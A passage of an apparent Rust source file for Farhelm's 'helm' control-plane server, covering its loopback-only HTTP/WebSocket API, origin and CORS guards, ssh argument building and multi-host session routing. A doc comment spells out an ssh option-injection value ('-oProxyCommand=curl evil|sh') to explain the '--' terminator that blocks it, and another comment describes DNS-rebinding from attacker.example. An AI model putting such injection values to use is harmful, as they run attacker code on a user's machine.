//! The helm: Farhelm's single control-plane process.
//!
//! Per SPEC.md, exactly one helm runs at a time. It connects to
//! supervisors (locally over their unix socket, remotely over the user's
//! own ssh running `farhelm internal stdio`), aggregates their sessions,
//! and serves the UI and API over loopback HTTP/WS. It holds no
//! authoritative session state — supervisors are the authority.
//!
//! The loopback-only bind is enforced here — SPEC.md's security posture
//! says the helm refuses non-loopback addresses in v1, and this code simply
//! never binds anything else.
//!
//! ## The shape of the serving path (PLAN_M6.md item 5)
//!
//! Every request is answered against a FLEET, never against one
//! connection. `AppState` holds two things: the [`manager::ConnectionManager`],
//! which owns one connection actor per registered host and publishes each
//! host's live state, and the [`store::HelmStore`], which holds the
//! registry and the last-known session cache those actors drain into.
//!
//! Three consequences run through everything below:
//!
//! - **The session list is merged and paged.** [`aggregate::session_page`]
//!   merges one indexed page of helm.db's cross-host cache with the rows a
//!   connected host holds in the manager's memory when it has no identity
//!   to bind a cache write to, tags each row with its host, marks rows of
//!   non-connected hosts stale, and pages the result with a helm-level
//!   cursor that is deliberately independent of the wire cursor underneath
//!   it (see that module's docs).
//! - **Session operations route by owner.** [`route_session`] looks a
//!   session's host up in that same merged view and hands back the host's
//!   LIVE connection — or refuses, naming the state the host is actually
//!   in. Unreachable is not special-cased; it is one of six ways a host can
//!   fail to be connected, and all six refuse identically.
//! - **Hosts are managed over REST.** [`hosts`] is the registry's own
//!   surface — add, retarget, remove, adopt, retry — and `--ensure-hosts`
//!   ([`ensure`]) is the same registration path run once at startup.
//!
//! M1's argv session flags (`--ssh`, `--cwd`, `--agent`, `--title`,
//! `--remote-farhelm`, `--remote-state-dir`) are gone in this same PR: the
//! registry and the create API are the mechanism now, and the last two live
//! on as per-host registry fields.

use anyhow::Context;
use axum::{
    Router,
    extract::{Path as AxPath, Query, State, WebSocketUpgrade, ws},
    response::IntoResponse,
    routing::get,
};
use clap::Args;
use farhelm_proto::io::ClosedBeforeHello;
use farhelm_proto::{ErrorKind, TerminalSelector};
use serde::Deserialize;
use std::net::{Ipv4Addr, SocketAddr};
use std::path::PathBuf;
use std::sync::Arc;
use tracing::{error, info, warn};

mod client;
pub use client::{
    CreateExtras, PeerHello, SessionListing, SessionPage, SupervisorClient, SupervisorError,
    TermDetachSignal, TermEvent, TermStream,
};

/// The merged multi-host session list and the helm-level cursor that pages
/// it — what `GET /api/sessions` is built out of.
mod aggregate;

/// `--ensure-hosts`: the JSON5 floor under the registry, applied once
/// before serving starts.
mod ensure;

/// `/api/hosts` — the registry's REST surface, and the JSON shape a UI
/// renders a host chip from.
mod hosts;

/// The per-host connection actors, their reconnect state machine, and the
/// cache refresh that rides them (PLAN_M6.md item 4).
///
/// Public because the desktop embedder drives one directly, and because the
/// real-transport tests in `farhelm`'s e2e suite are written against it.
pub mod manager;

pub mod store;

/// The scripted-fleet harness the REST tests in this crate stand a real
/// serving path up on. Test-only, but its own module because three test
/// modules share it.
#[cfg(test)]
mod rest_harness;

#[cfg(test)]
mod test_capture;

/// CLI arguments for `farhelm helm run`. Lives here (not in the bin
/// crate) so the helm's surface and its implementation evolve together.
///
/// M1's session and transport flags are deliberately absent (PLAN_M6.md
/// item 5, user decision 2026-08-04). `--ssh`/`--remote-farhelm`/
/// `--remote-state-dir` became per-host registry fields, and
/// `--cwd`/`--agent`/`--title` became `POST /api/sessions` — a helm now
/// drives every registered host at once, so an argv flag naming ONE of
/// them could only ever have meant the wrong thing.
#[derive(Args, Debug, Clone)]
pub struct HelmArgs {
    /// Loopback port for the web UI and API.
    #[arg(long, default_value_t = 7433)]
    pub port: u16,

    /// State directory (default: ~/.local/state/farhelm). Holds helm.db,
    /// the ssh ControlMaster sockets, and — in the ordinary single-machine
    /// arrangement — the local supervisor's socket the reserved local host
    /// row is reached through.
    #[arg(long)]
    pub state_dir: Option<PathBuf>,

    /// Directory with the built web UI (index.html + assets). Without
    /// it the API still serves; the UI returns 404.
    #[arg(long)]
    pub ui_dist: Option<PathBuf>,

    /// JSON5 file of hosts to guarantee are registered at startup:
    /// `{ hosts: [ { ssh, remote_farhelm?, remote_state_dir? } ] }`.
    ///
    /// An additive floor over helm.db, applied before serving begins and
    /// never consulted again — see `crate::ensure` for what it does and
    /// does not promise. Built for half-automated setups and agent-driven
    /// testing, where a fleet has to exist before anything can drive it.
    #[arg(long)]
    pub ensure_hosts: Option<PathBuf>,
}

/// What the axum handlers share: the fleet, in its two halves.
///
/// The manager is authority for what each host is DOING right now (and
/// holds the only live connections); the store is authority for what the
/// registry says and for the last-known sessions every host's actor drains
/// into it. Every handler below reaches for one or both, and none of them
/// holds a connection of its own — see this crate's docs for why the
/// single-client `AppState` this replaced could not survive multi-host.
struct AppState {
    manager: Arc<manager::ConnectionManager>,
    store: store::HelmStore,
}

/// Assemble the routes, optional static UI service, and loopback-origin
/// middleware that `run()` serves.
///
/// Pulled out of `run()` so tests can drive the real middleware stack
/// in-process (via `tower::ServiceExt::oneshot`) against a scripted fleet,
/// instead of only exercising handlers directly and silently skipping the
/// origin guard and its response headers.
fn build_router(state: Arc<AppState>, ui_dist: Option<&std::path::Path>, port: u16) -> Router {
    let mut app = Router::new()
        .route("/api/sessions", get(list_sessions).post(create_session))
        .route("/api/sessions/{id}/stop", axum::routing::post(stop_session))
        .route(
            "/api/sessions/{id}/restart",
            axum::routing::post(restart_session),
        )
        .route(
            "/api/sessions/{id}/rename",
            axum::routing::post(rename_session),
        )
        .route(
            "/api/sessions/{id}",
            get(get_session).delete(delete_session),
        )
        .route("/api/sessions/{id}/tabs", axum::routing::post(open_tab))
        .route(
            "/api/sessions/{id}/tabs/{tab_id}",
            axum::routing::delete(close_tab),
        )
        .route(
            "/api/sessions/{id}/attachments",
            // SPEC.md's "no size cap in v1" is a promise about MEMORY,
            // not about axum's own 2 MiB default request-body limit —
            // this route disables that default so a large screenshot or
            // recording is refused nowhere in the helm at all, while every
            // other route (small JSON bodies) keeps the default's
            // protection against a runaway control-message body.
            axum::routing::post(upload_attachment)
                .options(attachment_preflight)
                .layer(axum::extract::DefaultBodyLimit::disable())
                // Scoped to this ONE route rather than the router: it is
                // the only endpoint a cross-origin caller has any reason
                // to reach (see `attachment_cors`), and a CORS header on
                // the session list or the delete route would widen what a
                // custom-scheme page can read for no benefit.
                .layer(axum::middleware::from_fn(attachment_cors)),
        )
        .route("/api/sessions/{id}/term", get(term_ws))
        // Host management (PLAN_M6.md item 5). The two verb routes are
        // shaped like the session verbs (`/stop`, `/rename`) rather than as
        // PATCHes, for the reason `rename_session` records: each changes
        // exactly one thing, and naming the thing is clearer than inventing
        // a partial-update shape this API has nowhere else.
        .route("/api/hosts", get(hosts::list_hosts).post(hosts::add_host))
        .route("/api/hosts/{id}", axum::routing::delete(hosts::remove_host))
        .route(
            "/api/hosts/{id}/destination",
            axum::routing::post(hosts::set_destination),
        )
        .route(
            "/api/hosts/{id}/adopt",
            axum::routing::post(hosts::adopt_host),
        )
        .route(
            "/api/hosts/{id}/retry",
            axum::routing::post(hosts::retry_host),
        )
        .with_state(state);

    if let Some(dist) = ui_dist {
        let serve = tower_http::services::ServeDir::new(dist).fallback(
            tower_http::services::ServeFile::new(dist.join("index.html")),
        );
        app = app.fallback_service(serve);
    }

    app.layer(axum::middleware::from_fn(
        move |req: axum::extract::Request, next: axum::middleware::Next| {
            require_loopback_origin(port, req, next)
        },
    ))
}

/// Run the helm until the process is killed: open helm.db, apply any
/// `--ensure-hosts` floor, start a connection actor per registered host,
/// and serve the API and UI on loopback.
///
/// Startup order is deliberate at three points, each for a different
/// reason:
///
/// - The listener is bound FIRST, so the likely failure (port busy because
///   a helm is already running) happens before anything else has been set
///   up or written.
/// - `--ensure-hosts` is ingested BEFORE the manager starts, so the
///   guaranteed hosts have actors from the first moment rather than after a
///   reconcile — and so a bad file fails startup before anything is
///   serving. See [`ensure::ingest`] for its all-or-nothing contract.
/// - The manager returns as soon as its actors are SPAWNED, not once they
///   have connected. A down host must never delay the helm's startup: it is
///   simply a host in a non-connected state, which the API exposes for the
///   forthcoming UI to draw.
///
/// Returns only on a fatal error. There is no graceful-shutdown path, and
/// none is needed: SPEC.md's whole durability promise is that killing the
/// helm does nothing to any session.
pub async fn run(args: HelmArgs) -> anyhow::Result<()> {
    let state_dir = match args.state_dir.clone() {
        Some(dir) => dir,
        None => farhelm_supervisor::default_state_dir()?,
    };
    // 0700: this directory holds helm.db and ssh ControlMaster sockets.
    farhelm_supervisor::ensure_private_dir(&state_dir).await?;

    // Bind before creating anything on a host. A busy port is the likely
    // failure here (a helm is already running), and failing afterwards
    // would strand a live agent session on every retry.
    // Loopback only — deliberately not configurable in v1 (SPEC.md).
    let bind_addr = SocketAddr::from((Ipv4Addr::LOCALHOST, args.port));
    let listener = tokio::net::TcpListener::bind(bind_addr)
        .await
        .with_context(|| format!("binding {bind_addr}"))?;
    // Use the bound address rather than the requested one. This keeps
    // programmatic callers that request port 0 coherent: Host validation
    // and the printed URL must name the ephemeral port the OS chose.
    let addr = listener
        .local_addr()
        .context("reading bound helm address")?;

    let store = store::HelmStore::open(&state_dir.join("helm.db")).await?;
    if let Some(path) = args.ensure_hosts.as_deref() {
        ensure::ingest(&store, path).await?;
    }
    let manager = manager::ConnectionManager::start(
        store.clone(),
        Arc::new(manager::SystemTransport::new(&state_dir)),
        manager::Cadence::default(),
    )
    .await?;

    let app = build_router(
        Arc::new(AppState { manager, store }),
        args.ui_dist.as_deref(),
        addr.port(),
    );

    // Printed on stdout, not logged: the README tells the user to open
    // this URL, and tracing goes to stderr behind an env filter.
    println!("farhelm helm: http://{addr}/");
    // Loopback keeps other MACHINES out, not other local accounts: until
    // the web token lands (M7, SPEC.md's Security section), any process
    // on this machine can drive the API — which includes launching
    // arbitrary commands as this user. Said out loud rather than left
    // for a security audit to rediscover.
    tracing::warn!(
        "the API on {addr} is unauthenticated in M1: any local user on this machine can \
         create and drive sessions (the web token that closes this arrives in a later milestone)"
    );
    axum::serve(listener, app).await?;
    Ok(())
}

/// Reject requests whose `Host` — or, for browsers, `Origin` — is not
/// this helm's own loopback address.
///
/// Binding to 127.0.0.1 keeps other machines out, but not other origins
/// in the user's own browser: a page on attacker.example can rebind its
/// DNS to 127.0.0.1 and then read `/api/sessions` and open terminal
/// WebSockets as if same-origin — and typing into an agent's terminal is
/// code execution as the user. WebSocket upgrades bypass CORS entirely,
/// so this check, not the browser, is the defense. It is independent of
/// the web token SPEC.md schedules for a later milestone, and wanted
/// alongside it.
async fn require_loopback_origin(
    port: u16,
    req: axum::extract::Request,
    next: axum::middleware::Next,
) -> axum::response::Response {
    if !origin_is_allowed(req.headers(), port) {
        return (
            axum::http::StatusCode::FORBIDDEN,
            "request must originate from this helm's loopback address\n",
        )
            .into_response();
    }
    let mut resp = next.run(req).await;
    // Framing defense. The header check above cannot stop an
    // `<iframe src="http://127.0.0.1:PORT/">`: a GET navigation sends no
    // Origin, so it passes, and the framed page's own fetches are then
    // genuinely same-origin. The frame is unreadable cross-origin, but
    // it is a focused terminal wired to a live agent — clickjacking
    // would deliver keystrokes, which is command execution.
    let headers = resp.headers_mut();
    headers.insert(
        axum::http::header::X_FRAME_OPTIONS,
        axum::http::HeaderValue::from_static("DENY"),
    );
    headers.insert(
        axum::http::header::CONTENT_SECURITY_POLICY,
        axum::http::HeaderValue::from_static("frame-ancestors 'none'"),
    );
    resp
}

/// The header decision behind [`require_loopback_origin`], as a pure
/// function so its matrix is unit-testable (a browser cannot set `Host`,
/// so the integration test can only reach the Origin half).
fn origin_is_allowed(headers: &axum::http::HeaderMap, port: u16) -> bool {
    let is_loopback_authority = |value: &str| -> bool {
        // Host carries no scheme; Origin does. Strip a known scheme and
        // refuse anything still containing '/': deriving the authority
        // by splitting on '/' would accept any value that merely ENDS
        // in a loopback authority ("evil.example/127.0.0.1:7433"). No
        // browser emits such a Host/Origin, but this check is the sole
        // gate in front of command execution, so it must not lean on
        // the client's URL parser for its own correctness.
        let authority = value
            .strip_prefix("http://")
            .or_else(|| value.strip_prefix("https://"))
            .unwrap_or(value);
        if authority.contains('/') {
            return false;
        }
        // Browsers omit the port from Host and Origin when it is the
        // scheme default, so on `--port 80` the explicit-`:80` forms
        // below never match and every request would 403 — a functional
        // lockout of a legal flag value. Accept the bare authorities for
        // exactly that port; everything else stays exact-match.
        if port == 80 && matches!(authority, "127.0.0.1" | "localhost" | "[::1]") {
            return true;
        }
        authority == format!("127.0.0.1:{port}")
            || authority == format!("localhost:{port}")
            || authority == format!("[::1]:{port}")
    };

    let host_ok = headers
        .get(axum::http::header::HOST)
        .and_then(|v| v.to_str().ok())
        .is_some_and(&is_loopback_authority);

    // A missing Origin is fine — curl and other non-browser clients omit
    // it — but a present one must match. The desktop target is the
    // exception: its webview serves the app from dioxus's custom scheme,
    // so its WebSocket carries that origin. A web page cannot forge a
    // custom-scheme Origin, which is why this is safe to allow; `null`
    // (sandboxed iframes, data: documents) deliberately is not.
    let origin_ok = headers.get(axum::http::header::ORIGIN).is_none_or(|v| {
        v.to_str()
            .is_ok_and(|o| is_loopback_authority(o) || is_desktop_webview_origin(o))
    });

    host_ok && origin_ok
}

/// Whether an `Origin` is one of the desktop build's own webview schemes.
///
/// The single definition of "the desktop app is calling", shared by
/// [`origin_is_allowed`] (which decides whether the request is answered at
/// all) and [`attachment_cors`] (which decides whether the ANSWER may be
/// read). Two lists would be a way for those to disagree, and disagreeing
/// means either the desktop build breaks or a web page gets CORS access it
/// was never meant to have.
///
/// Safe to allow because a web page cannot forge a custom-scheme `Origin`:
/// only a native webview serving the app from that scheme produces one.
fn is_desktop_webview_origin(origin: &str) -> bool {
    origin.starts_with("dioxus://") || origin.starts_with("wry://")
}

/// The CORS headers the attachment upload route answers desktop callers
/// with — and the reason SPEC.md's "the two client forms have the same
/// capabilities" survives contact with the desktop build.
///
/// The web build has no CORS problem: the helm serves the page, so its
/// uploads are same-origin. The desktop build does. Its page is served by
/// wry from a custom scheme while the helm answers on
/// `http://127.0.0.1:<port>`, so every `fetch` from it is cross-origin —
/// and unlike the terminal WebSocket (upgrades are not CORS-gated, which
/// is why terminals have always worked there), an upload is a plain
/// request the WEBVIEW will refuse to hand back unless the response says
/// the caller may read it. Without this the desktop attachment flow fails
/// in the worst way available: the bytes reach the supervisor and publish,
/// the reply carrying the path is withheld from the page, and the user is
/// told their attachment failed while a copy of it sits on the host.
///
/// Deliberately narrow in every direction:
///
/// - Only [`is_desktop_webview_origin`] origins get headers at all — the
///   same origins the loopback guard already lets through, echoed back
///   rather than answered with `*`, with `Vary: Origin` so nothing caches
///   one origin's answer for another.
/// - Only this route carries it (see `build_router`). The session list and
///   the delete route have no cross-origin caller, so they get no
///   cross-origin readability.
/// - Only the methods and header this route actually needs: `POST` (plus
///   the `OPTIONS` preflight itself), and `content-type`, which is what
///   makes the browser preflight in the first place — `fetch(url, {body:
///   file})` sets it from the blob, and an image type is not one of the
///   three CORS-simple values.
///
/// Applied as a middleware rather than inside the handler because the
/// headers have to be on EVERY answer, error ones included: a 500 the page
/// cannot read is a failure with no message, which is precisely the
/// silent-failure mode SPEC.md's "upload failures must be visible" rules
/// out. The one response it deliberately does not reach is the loopback
/// guard's own 403, which is outside this layer — an origin that was
/// refused must not be handed the means to read the refusal.
async fn attachment_cors(
    req: axum::extract::Request,
    next: axum::middleware::Next,
) -> axum::response::Response {
    let origin = req
        .headers()
        .get(axum::http::header::ORIGIN)
        .and_then(|value| value.to_str().ok())
        .filter(|origin| is_desktop_webview_origin(origin))
        .map(|origin| origin.to_string());
    let mut response = next.run(req).await;
    let Some(origin) = origin else {
        return response;
    };
    // A header value that cannot be built from an origin this guard
    // already accepted would mean the origin contained control bytes; the
    // honest answer is then no CORS headers rather than a mangled one.
    let Ok(origin) = axum::http::HeaderValue::from_str(&origin) else {
        return response;
    };
    let headers = response.headers_mut();
    headers.insert(axum::http::header::ACCESS_CONTROL_ALLOW_ORIGIN, origin);
    headers.insert(
        axum::http::header::VARY,
        axum::http::HeaderValue::from_static("Origin"),
    );
    headers.insert(
        axum::http::header::ACCESS_CONTROL_ALLOW_METHODS,
        axum::http::HeaderValue::from_static("POST, OPTIONS"),
    );
    headers.insert(
        axum::http::header::ACCESS_CONTROL_ALLOW_HEADERS,
        axum::http::HeaderValue::from_static("content-type"),
    );
    // Ten minutes: long enough that a burst of pastes does not preflight
    // every time, short enough that a helm restarted with different rules
    // is not shadowed by a stale permission for the rest of the day.
    headers.insert(
        axum::http::header::ACCESS_CONTROL_MAX_AGE,
        axum::http::HeaderValue::from_static("600"),
    );
    response
}

/// The upload route's CORS preflight. Answers nothing itself — the body is
/// empty and the meaning is entirely in the headers [`attachment_cors`]
/// attaches on the way out.
///
/// Present as a real route because a preflight is a real request: without
/// it, `OPTIONS /api/sessions/{id}/attachments` is a 405 the browser reads
/// as "not allowed", and the desktop build's upload never leaves the page.
async fn attachment_preflight() -> axum::response::Response {
    axum::http::StatusCode::NO_CONTENT.into_response()
}

/// The ssh argv for reaching a remote supervisor, as a pure function so
/// the quoting seam is unit-testable — the ssh path as a whole cannot run
/// in CI, and this argv is where its subtlest bug class lives.
///
/// The trailing argv after the destination is not exec'd remotely: ssh
/// joins it with spaces and hands the string to the remote login shell,
/// so anything that may contain spaces (the remote state dir) must be
/// quoted as that shell will parse it, or the path word-splits remotely.
///
/// **`--` goes before the DESTINATION, not after it**, and that ordering is
/// a security boundary rather than a stylistic choice. A destination is
/// user-supplied text — a registry row anyone with helm access can write,
/// through `POST /api/hosts` or an `--ensure-hosts` file — so a value
/// shaped like
/// `-oProxyCommand=curl evil|sh` is parsed by OpenSSH's own getopt loop as
/// an OPTION and executed — a local command injection with no ssh
/// connection involved at all — for as long as the option terminator sits
/// anywhere after it. Placed first, `--` ends option parsing before ssh
/// ever looks at the destination, and it still covers the remote argv
/// (`--state-dir` below) that the old placement was protecting.
/// [`crate::store::HelmStore::add_ssh_host`] additionally refuses
/// option-shaped destinations at the registry boundary so the user gets a
/// clear error instead of a puzzling ssh failure; THIS ordering is the
/// actual guard, and it holds for callers that never go through the store.
///
/// The UTF-8 requirement enforced below is specific to this ssh path; the
/// local host's unix-socket transport keeps native `OsString` state paths
/// and still tolerates non-UTF-8 homes (see
/// `farhelm_supervisor::default_state_dir`), so a helm with no ssh rows
/// never meets this requirement at all.
fn ssh_args(
    dest: &str,
    control_path: &std::path::Path,
    remote_farhelm: &str,
    remote_state_dir: Option<&str>,
) -> anyhow::Result<Vec<String>> {
    // This is the last point a local filesystem path is still a `Path`
    // before it is embedded in text handed to ssh. The alternative,
    // `Path::to_string_lossy`, does not fail on a non-UTF-8 path — it
    // silently substitutes replacement characters and produces a
    // *different* path, which ssh would then happily create or connect to
    // a ControlMaster socket under, with no indication anything went
    // wrong. Rejecting loudly here, naming the path, is what makes ssh
    // config values and argv text safe to build from a `Path`: unlike
    // `ControlMsg::cwd` (farhelm-proto's own UTF-8-only wire contract),
    // this path never crosses the protocol at all — the requirement here
    // comes from ssh treating both its `-o` values and its remote argv as
    // text, not from anything upstream.
    let control_path_str = control_path.to_str().with_context(|| {
        // `to_string_lossy`, not `{control_path:?}`: the point of naming
        // the path in the error is so the user can recognize WHICH one is
        // unusable, and Debug's `\xFF`-escaped form is far less
        // recognizable at a glance than the lossy rendering of the parts
        // that are valid UTF-8.
        format!(
            "path {} is not valid UTF-8; ssh's ControlPath option and remote argv are handled \
             as text and cannot represent it — rename it or point --state-dir elsewhere",
            control_path.to_string_lossy()
        )
    })?;
    let control_path = ssh_control_path_option(control_path_str);
    let mut args = vec![
        "-o".to_string(),
        "BatchMode=yes".to_string(),
        "-o".to_string(),
        "ControlMaster=auto".to_string(),
        "-o".to_string(),
        control_path,
        "-o".to_string(),
        "ControlPersist=60".to_string(),
        // See this function's own docs: the terminator precedes the
        // destination so an option-shaped destination can never be read as
        // an option.
        "--".to_string(),
        dest.to_string(),
        shell_words::quote(remote_farhelm).into_owned(),
        "internal".to_string(),
        "stdio".to_string(),
    ];
    if let Some(remote_state) = remote_state_dir {
        args.push("--state-dir".to_string());
        args.push(shell_words::quote(remote_state).into_owned());
    }
    Ok(args)
}

/// Encode a ControlPath for OpenSSH's config-value parser.
///
/// This is not shell quoting: `-o` values use ssh_config tokenization,
/// then expand percent tokens. Quotes and backslashes need config
/// escapes, while user-supplied `%` must become `%%`; only the final `%C`
/// added by Farhelm remains an expansion token. Takes `&str` rather than
/// `&Path`: the UTF-8 check belongs to the caller (`ssh_args`), the one
/// actual boundary where a local `Path` becomes ssh-config text — this
/// function is a pure string encoder with nothing left to reject.
fn ssh_control_path_option(raw: &str) -> String {
    let (prefix, suffix) = raw
        .strip_suffix("%C")
        .map_or((raw, ""), |prefix| (prefix, "%C"));
    let escaped = prefix
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('%', "%%");
    format!("ControlPath=\"{escaped}{suffix}\"")
}

/// Turn "the ssh channel closed before the handshake finished" into
/// something that names the CANDIDATE causes instead of just the symptom.
///
/// Nothing on this side can narrow it further, and the message says so
/// rather than picking one. Two quite different failures land here
/// identically. The common one: `farhelm internal stdio` on the remote
/// dials the local supervisor socket before it speaks a word of the wire
/// protocol, so a host with no supervisor bound makes the proxy exit
/// immediately — and the remote's own `Error: ... Connection refused`
/// reaches the operator only as relayed ssh stderr, disconnected from
/// this side's `anyhow` chain. The other: ssh itself never got as far as
/// running anything (auth refused, host unresolvable, `remote_farhelm`
/// missing), which also closes the channel with zero bytes spoken. Both
/// produce a byte-for-byte identical [`ClosedBeforeHello`], so the remedy
/// is offered as a possibility and the operator is pointed at the ssh
/// stderr that disambiguates it.
///
/// Matching is by TYPE, never by `io::ErrorKind`: a peer that spoke half a
/// hello and died raises `UnexpectedEof` as well, and telling that
/// operator to go start a supervisor would be a wrong answer stated
/// confidently. Everything else (a version-skewed peer that spoke and was
/// refused, a decode failure) already carries its own accurate message and
/// passes through untouched.
///
/// `remote_state_dir` is the registry row's own field (M1's
/// `--remote-state-dir`, now per-host), passed through so the suggested
/// command is one the operator can paste: a supervisor started without it
/// binds a socket the remote proxy will not dial.
fn annotate_ssh_handshake_eof(
    e: anyhow::Error,
    dest: &str,
    remote_state_dir: Option<&str>,
) -> anyhow::Error {
    let closed_before_hello = e
        .chain()
        .filter_map(|cause| cause.downcast_ref::<std::io::Error>())
        .any(ClosedBeforeHello::is_cause_of);
    if !closed_before_hello {
        return e;
    }
    // Quoted the way the REMOTE shell will read it, matching how the same
    // directory is passed in `ssh_args` — a path with a space has to
    // survive being pasted into a shell there.
    let remedy = match remote_state_dir {
        Some(dir) => format!(
            "farhelm supervisor run --state-dir {}",
            shell_words::quote(dir)
        ),
        None => "farhelm supervisor run".to_string(),
    };
    e.context(format!(
        "the ssh channel to {dest} closed before the handshake completed: either no supervisor \
         is running on {dest} (start one there with `{remedy}`), or the ssh connection itself \
         failed — ssh reports its own errors on stderr, which the connection manager relays \
         into the helm's log for this host"
    ))
}

/// Query parameters for `GET /api/sessions` — the helm-level page walk
/// (PLAN_M6.md item 5).
///
/// Both absent is a fresh walk of the first [`aggregate::DEFAULT_PAGE_LIMIT`]
/// entries, which is what every pre-M6 caller sends and what the UI in this
/// tree still sends. That is the whole compatibility story for this route's
/// query string: it gained two optional parameters and no required one.
#[derive(Deserialize)]
struct ListQuery {
    /// An opaque resume key from a previous reply's `next_cursor`. Replay
    /// it verbatim; never construct or interpret one. An undecodable value
    /// is a 400 rather than a silent restart from the front, because a
    /// restart would re-serve a page the caller already had while looking
    /// exactly like progress.
    cursor: Option<String>,
    /// Maximum entries in this page. Deliberately uncapped: the merged list
    /// is local data this process has already read, so a large page costs
    /// serialization rather than a fan-out of host round trips. A limit of
    /// zero is refused — it could never make progress through the pages.
    limit: Option<usize>,
}

/// `GET /api/sessions` — one page of the MERGED, multi-host session list
/// (PLAN_M6.md item 5).
///
/// The rows are every registered host's sessions in one creation-time
/// order, each tagged with the host it lives on and marked `stale` when
/// that host is not currently connected — SPEC.md's "sessions on an
/// unreachable host stay in the list, clearly marked" is this handler plus
/// the cache behind it, and nothing else.
///
/// The body keeps its M2 shape (`sessions`/`total`/`truncated`) with the
/// host fields added to each row and `next_cursor` added alongside, so the
/// UI that predates multi-host keeps decoding it unchanged. `total` now
/// counts the merged view rather than one supervisor's list, and
/// `truncated` now means "there is a next page" rather than "entries were
/// held back" — see [`aggregate::SessionPageBody`] for both.
///
/// Served from what the helm has already RECORDED, never by asking hosts
/// (see [`aggregate`]'s module docs for why the two cursor layers are
/// decoupled): helm.db for every host that caches, and the manager's
/// in-memory list for a connected host that has no identity to bind a cache
/// write to. Either way nothing here makes a network call, so a slow or
/// flapping host cannot slow a list poll down.
///
/// One consequence is worth stating rather than discovering: a session
/// created on ANOTHER client appears here only after its host's next
/// refresh, so this list trails such a create by up to one refresh
/// interval. A session created through this helm is recorded by the create
/// itself, and is routable immediately either way — routing does not go
/// through this handler.
async fn list_sessions(
    State(state): State<Arc<AppState>>,
    Query(q): Query<ListQuery>,
) -> impl IntoResponse {
    let limit = match q.limit {
        None => aggregate::DEFAULT_PAGE_LIMIT,
        Some(0) => {
            return http_error(anyhow::Error::new(SupervisorError {
                kind: ErrorKind::InvalidRequest,
                message: "session list limit must be at least 1; a limit of 0 could never make \
                          progress through the pages"
                    .to_string(),
            }));
        }
        Some(limit) if limit > crate::aggregate::MAX_PAGE_LIMIT => {
            return http_error(anyhow::Error::new(SupervisorError {
                kind: ErrorKind::InvalidRequest,
                message: format!(
                    "session list limit must be at most {}; a page is real work on this side, \
                     and an unbounded one is a request to do all of it at once",
                    crate::aggregate::MAX_PAGE_LIMIT
                ),
            }));
        }
        Some(limit) => limit,
    };
    match aggregate::session_page(&state.manager, &state.store, q.cursor.as_deref(), limit).await {
        Ok(page) => axum::Json(page).into_response(),
        Err(e) => http_error(e),
    }
}

/// Find the live connection for the host that owns `session_id`, or refuse
/// naming the state that host is actually in (PLAN_M6.md item 5).
///
/// The single owner-lookup path every session operation goes through. Two
/// properties are the whole point:
///
/// - **The state and the client are read TOGETHER**, from one borrow of the
///   actor's published status ([`manager::ConnectionManager::status`]). Two
///   separate reads can straddle a transition and hand back a fresh
///   `Connected` beside a `None` client, or a live-looking client beside a
///   dead state — which is exactly how an operation gets routed onto a
///   corpse.
/// - **Every non-connected state refuses identically**, with the state
///   named. Unreachable is not special; it is merely the common case. A
///   skewed, mismatched, duplicate, or retired host refuses the same way,
///   because the alternative is a caller that handles four of the six and
///   silently mis-handles the rest. Nothing queues — SPEC.md v1 refuses
///   rather than deferring.
///
/// A session nothing knows about is a 404. A session created HERE is
/// routable immediately — `create_session` seeds it into its host's cache
/// in the same handler — so that 404 means "no host has ever reported this
/// id", not "you were too quick". A session created by another client on
/// another host is the one case that waits, for up to one refresh interval,
/// which is the price of a list that never fans out to N hosts per request.
async fn route_session(
    state: &AppState,
    session_id: &str,
) -> anyhow::Result<(manager::SessionClaim, Arc<SupervisorClient>)> {
    let (host, status) = resolve_owner(state, session_id).await?;
    // The claim comes out of the SAME status this routed by, so an
    // operation whose reply is recorded afterwards (restart, rename) files
    // it against the connection it actually used — see
    // `manager::SessionClaim`.
    let identity = match &status.state {
        manager::HostState::Connected { identity, .. } => identity.clone(),
        _ => None,
    };
    let claim = manager::SessionClaim {
        host,
        incarnation: status.incarnation,
        identity,
    };
    let client = status.client.ok_or_else(|| {
        anyhow::Error::new(SupervisorError {
            kind: ErrorKind::Conflict,
            message: refusal_text(host, &status.state),
        })
    })?;
    Ok((claim, client))
}

/// Which host owns `session_id`, and that host's live status — read
/// together, from the two places a session can be known.
///
/// helm.db answers for every host that caches; the manager's in-memory
/// lists answer for a connected host that reports no identity and has none
/// on record, which therefore caches nothing (see
/// [`manager::HostSnapshot::live_sessions`]). Both are consulted because
/// either alone leaves a whole class of session unroutable: without the
/// first, nothing survives a helm restart; without the second, an
/// identity-less host reads as connected and empty while its sessions are
/// unreachable.
///
/// The in-memory lookup and the status it returns come from ONE hold of the
/// manager's actor map ([`manager::ConnectionManager::live_owner`]), not
/// from a snapshot followed by a second call. Split across two reads, a
/// reconnect landing in between pairs one install's session claim with the
/// next install's client — the same hazard the status accessor exists to
/// prevent for the cached case, and it deserves the same answer rather than
/// a second, weaker one.
///
/// The lookup is deliberately independent of whether the session's cached
/// METADATA still decodes: routing asks where to send an operation, not
/// what the session is, so a poisoned `info_json` must not make a live
/// session unreachable.
///
/// FAILS CLOSED where two hosts claim one id, with the ambiguity named —
/// including a collision a create discovered and recorded
/// ([`AppState::contested_sessions`]). helm.db makes that unconstructible
/// within itself, but a create can still mint an id another host already
/// holds, and picking one would mean a stop aimed at one machine landing on
/// another. A contested entry clears itself as soon as the fleet agrees
/// again, so a collision that resolved needs no intervention.
async fn resolve_owner(
    state: &AppState,
    session_id: &str,
) -> anyhow::Result<(crate::store::HostId, manager::HostStatus)> {
    // Contested claims come first, from live refresh state rather than a
    // remembered incident: a host that STILL reports an id another host's
    // cache holds is a standing disagreement, and there is no honest owner
    // to route to while it stands. A claimant that stopped reporting the
    // id, was removed, or had its cache purged by an adoption is simply not
    // in this answer — the contest clears itself with the evidence that
    // made it.
    let contested = state.manager.contested_claimants(session_id);
    let cached = state.store.host_of_session(session_id).await?;
    if let Some(claimant) = contested.first()
        && let Some(owner) = cached
        && owner != *claimant
    {
        return Err(anyhow::Error::new(
            crate::store::HostStoreError::SessionOwnerAmbiguous {
                session: session_id.to_string(),
                first: owner.min(*claimant),
                second: owner.max(*claimant),
            },
        ));
    }

    let live = state.manager.live_owner(session_id)?;
    match (cached, live) {
        (None, None) => Err(anyhow::Error::new(SupervisorError {
            kind: ErrorKind::NotFound,
            message: format!("no such session: {session_id}"),
        })),
        // The in-memory answer carries its own status from the same lock
        // hold, so it is used as it stands rather than looked up again.
